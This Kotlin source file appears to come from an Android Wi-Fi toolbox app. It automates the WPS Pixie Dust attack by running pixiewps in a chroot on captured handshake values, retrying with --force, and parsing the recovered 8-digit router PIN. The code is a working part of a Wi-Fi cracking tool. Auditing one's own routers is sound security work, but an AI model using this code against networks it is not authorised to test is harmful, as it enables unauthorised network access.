package io.github.bszapp.wifitoolbox.service.task

import io.github.bszapp.wifitoolbox.contract.task.WpsHandshake
import io.github.bszapp.wifitoolbox.service.TerminalManager
import java.util.concurrent.CountDownLatch
import java.util.concurrent.TimeUnit
import java.util.concurrent.atomic.AtomicInteger

/**
 * 在 chroot 中调用 `/bin/pixiewps` 现场计算随机数缺陷（pixie dust）漏洞 PIN。
 *
 * pixiewps 已安装在 `/bin`，直接按命令名调用即可。每次计算都新开一个短命 chroot 终端，
 * 命令输出结束后立即退出；先按默认模式计算，没有结果时用 `--force` 全范围再试一次。
 * 两次都没有解出 PIN 时返回 null，由调用方记录日志并继续枚举。
 */
internal class WpsPixieSolver(private val terminals: TerminalManager) {

    /** @return 8 位数字 PIN；未能解出时返回 null。 */
    fun solve(handshake: WpsHandshake, context: TaskContext, checkRunning: () -> Unit = context::ensureRunning): String? {
        runOnce(handshake, force = false, context, checkRunning)?.let { return it }
        checkRunning()
        context.log("pixiewps 未能直接解出 PIN，使用 --force 全范围重算")
        return runOnce(handshake, force = true, context, checkRunning)
    }

    private fun runOnce(handshake: WpsHandshake, force: Boolean, context: TaskContext, checkRunning: () -> Unit): String? {
        checkRunning()
        val output = StringBuilder()
        val finished = CountDownLatch(1)
        val exitCode = AtomicInteger(Int.MIN_VALUE)
        val terminalId = terminals.createChrootTerminal(
            onOutputLines = { _, lines ->
                synchronized(output) { lines.forEach { output.append(it).append('\n') } }
                if (lines.any { PIN_LINE.containsMatchIn(it) }) finished.countDown()
            },
            onExit = { _, code -> exitCode.set(code); finished.countDown() },
        )
        var timedOut = false
        try {
            // 命令执行完直接退出 shell，终端随即结束，避免长期占用 chroot 会话。
            terminals.writeInput(terminalId, command(handshake, force) + "; exit")
            val deadline = System.nanoTime() + TimeUnit.SECONDS.toNanos(TIMEOUT_SECONDS)
            while (true) {
                checkRunning()
                val remaining = deadline - System.nanoTime()
                if (remaining <= 0) {
                    timedOut = true
                    context.log("pixiewps 计算超过 ${TIMEOUT_SECONDS} 秒未结束，放弃本次计算")
                    break
                }
                if (finished.await(minOf(remaining, TimeUnit.MILLISECONDS.toNanos(50)), TimeUnit.NANOSECONDS)) break
            }
        } finally {
            runCatching { terminals.stopTerminalAndAwait(terminalId, "pixiewps 计算结束") }
                .onFailure { context.log("结束 pixiewps 终端失败：${it.message}") }
        }
        val text = synchronized(output) { output.toString() }
        text.lineSequence().filter { it.isNotBlank() }.forEach { context.log("pixiewps: $it") }
        if (timedOut || exitCode.get() != 0) return null
        return PIN_LINE.findAll(text).lastOrNull()
            ?.groupValues?.get(1)?.trim()?.trim('\'', '"')
            ?.let { if (it == "<empty>") null else it }
            ?.takeIf { it.length == 8 && it.all(Char::isDigit) }
    }

    private fun command(handshake: WpsHandshake, force: Boolean): String =
        "pixiewps --pke ${handshake.pke} --pkr ${handshake.pkr}" +
            " --e-hash1 ${handshake.eHash1} --e-hash2 ${handshake.eHash2}" +
            " --authkey ${handshake.authKey} --e-nonce ${handshake.eNonce}" +
            if (force) " --force" else ""

    private companion object {
        const val TIMEOUT_SECONDS = 90L
        val PIN_LINE = Regex("""\[\+]\s*WPS pin:\s*(\S+)""")
    }
}
